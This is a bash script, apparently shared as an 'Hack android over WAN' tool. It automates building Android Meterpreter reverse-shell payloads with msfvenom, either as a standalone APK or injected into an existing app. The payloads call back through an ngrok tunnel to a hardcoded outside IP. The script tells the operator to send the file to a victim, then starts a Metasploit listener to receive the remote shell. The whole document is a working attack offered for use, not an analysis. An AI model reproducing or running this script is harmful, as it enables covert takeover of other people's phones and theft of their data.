#! /bin/bash
mkdir /root/Desktop/MSF_PAYLOADS
#Install##########################################################
setterm --foreground green
echo "If you are running for the first time you will need to install some packages"
echo "Install [y/n]?"
read inst
case "$inst" in
	[yY]*)
	echo "Installing Packages..."
	sleep 1.5
	apt-get update
	apt-get install postgresql -y
	apt-get install zipalign -y
	echo "Packages Installed"
	sleep 2
	echo "Starting Script..." ;;
	*)
	echo "Starting Script..." ;;
esac
#################################################################
clear
echo "Hack android over WAN by CattSec"
echo "#IMPORTANT# You need to have ngrok installed on your machine first. Do you have NGROK installed? [y/n]: "
read yn
####Begining Services############################################
case "$yn" in
	[yY]*)
	echo "All Good. Starting services..."
	sleep 2 ;;
	*)
	echo "Please head over to 'https://ngrok.com/download' to download it for your distro"
	echo "Exiting Script"
	sleep 2
	exit ;;
esac
echo "Starting Ngrok Server on port 4444..."
sleep 2
xterm -hold -e /root/./ngrok tcp 4444 &
echo "Starting POSTGRESQL services..."
sleep 2
xterm -e service postgresql start
###################################################################
echo "Please enter the port number you see next to 'tcp://0.ngrok.io:_____'"
read port
#Make Payload
echo "Would you like to generate a payload or inject a payload? [g/i]: "
read answer
case "$answer" in
	[gG]*)
	echo "Please enter the name of your android payload: "
	read pn
	echo "OK, generating android payload..."
	sleep 1
	msfvenom -p android/meterpreter/reverse_tcp lhost=52.15.72.79 lport="$port" R > /root/Desktop/MSF_PAYLOADS/"$pn".apk ;;
	*)
	echo "Please enter the name of your android payload: "
	read pn
	echo "Please specify the location of the apk file you want to inject: "
	read apk
	echo "Injecting Payload into apk file..."
	sleep 2
	msfvenom -x "$apk" -p android/meterpreter/reverse_tcp lhost=52.15.72.79 lport=$port -o /root/Desktop/MSF_PAYLOAD$pn.apk ;;
esac
clear
setterm --foreground red
echo "ALl Done. Payloads are saved in /root/Desktop/MSF_PAYLOADS"

echo "Now send that file to your victim"
#Begin Listener
echo "Would you like to start a listener? [y/n]: "
read answer2
case "$answer2" in
	[yY]*)
	echo "Starting lister for your payload..."
	sleep 2
	touch meterpreter.rc
	echo use exploit/multi/handler >> meterpreter.rc
	echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc	
	echo set lhost 0.0.0.0 >> meterpreter.rc
	echo set lport 4444 >> meterpreter.rc
	echo exploit >> meterpreter.rc 
	msfconsole -r meterpreter.rc ;;
	*)
	echo "OK, Script Finished" ;;
esac
exit


